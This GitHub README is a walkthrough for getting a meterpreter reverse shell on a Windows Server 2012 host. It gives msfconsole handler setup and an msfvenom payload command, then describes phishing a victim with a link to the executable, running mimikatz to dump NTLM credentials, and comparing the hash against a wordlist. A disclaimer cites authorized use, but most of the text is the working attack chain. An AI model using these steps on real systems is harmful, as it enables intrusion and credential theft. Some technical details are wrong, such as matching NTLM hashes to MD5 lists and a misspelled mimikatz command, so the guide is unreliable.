![image](https://user-images.githubusercontent.com/101802030/225642283-5574f2d4-dca9-4769-9fb3-b5c3181bd344.png)


# theperfectreverseshell
This is a demonstration of obtaining a reverse shell on a Windows 2012 Server. The aim of obtaining access is to view and copy the output produced by downloading certain tools to the compromised host and then run a script to compare the produced data against a pre-defined list of data

### The following steps are provided to obtain a reverse shell on a Windows 2012 Server. The steps performed, were carried out in a secure environment. Please ensure, if you do choose to replicate this activity that you either do so as qualified practitioner or that you have a qualified practitioner with you.

# Step 1 : Create a reverse handler using metasploit. To do so, you run the following commands -
  - 1 - sudo msfconsole <br>
  - 2 - use multi/handler <br>
  - 3 - configure payload (preferable : windows/meterpreter/rerverse_tcp) <br>
  - 4 - ensure that the "LHOST" and "LPORT" settings are correctly configured. You may do so, by running : set LHOST <IP Address of Host> and the set LPORT <port you would like to listen on> <br>
  - 5 - once this has been completed, you may run : run -j or exploit -j at the msf prompt. This will create a persistent listener that will exit once you tell it to, it a disconnect from the client(victim). After doing so, you should see the following screen : <br>
  
  ![image](https://user-images.githubusercontent.com/101802030/225851486-2fa0062f-5b31-435c-8b7d-9b492d37a588.png)
  
  # Step 2 : Create an exploit using msfvenom. To do so, you run the following command -
  - 1 - sudo msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=8888 -f exe -o ~/Downloads/my_new_exploit.exe
  - And you should see the following output :
  
  ![image](https://user-images.githubusercontent.com/101802030/225945823-7e83ae7e-f211-4359-8b63-a72db0f21506.png)
  
  # Step 3 : Infect the victim machine with the exploit. In this case it will be a Windows Server 2012 edition. To do so, you may perform the following steps -
  - 1 - Host the exploit on a webserver, preferrably Linux. 
  - 2 - Create an e-mail containing a url link to the exploit
  - 3 - Send email to victim machine and have the link clicked on and run the executable. You should see the following screen on your server and/or C2
  
  ![image](https://user-images.githubusercontent.com/101802030/225951348-ec303cc6-1302-4ce9-bb98-a8710cf28dc6.png)
  
  # Step 4 : Download mimikatz and obtain ntlm hash. To do so, you use the following steps -
  - 1 - In your meterpreter session, type upload and the location of the file you would like to upload. In this case, it will be mimikatz. It could be a good idea to place it in your web servers root directory. See below example screenshot of this step being performed :
  
  ![image](https://user-images.githubusercontent.com/101802030/225954841-e3218cfe-4182-4a50-9935-e6114c380d5b.png)
  
  # Step 5 : Navigate to the infected hosts directory where you uploaded mimikatz to, in the previous step, and do the following -
  - 1 - Run mimikatz, by simply typing mimikatz.exe. Don't use tab(ever!). This should display the mimikatz console.
  - 2 - In order to obtain the ntlm hash, run the following command :
  - 2.1 - privilege::debug
  - 2.2 - sekurlsa::lognoPasswords
  - You should then see the following screen :
  
  ![image](https://user-images.githubusercontent.com/101802030/225957540-0887f031-02b4-44da-8a83-fac4887ce0cf.png)
  
  - 3 - Scroll down until you see the following output, and copy the ntlm hash -
  
  ![image](https://user-images.githubusercontent.com/101802030/225959132-c3beb498-afb0-499f-80bf-5e7d08f1646e.png)
  
  # Step 6 : Compare the ntlm hash against a list of words that have been converted to md5 hashes -
  - 1 - Create a script to compare the hashes. I used C# to create one. This would mean that, you will need a Windows computer to successfully perform this step. 
  - Please note : You may create a script in any language of your choice, python would be ideal, since it is very user-friendly. You will also need a list a of words converted to md5 hashes saved as a .txt file. The command would be as follows :
  - 2 - hashmatcher.exe <ntlm hash> <hash_word_file.txt>
  
  - See screenshot below, of the comparison being performed. Enjoy!
  
  ![image](https://user-images.githubusercontent.com/101802030/225962918-b259f5f7-dcaf-4053-bc15-9f43ae23af59.png)
  
  - As you can see, the program I have created in this case, is called hashmatcher. Unfortunately it is not publicly available, however I am upon to discussing acquiring the software at a minimal cost. Preferrably in Indian rupees.
  
  Disclaimer : All activities showcased are performed within the confines of legal law. Please ensure that these steps are only carried out on authorized hosts or within a home environment.








  
  


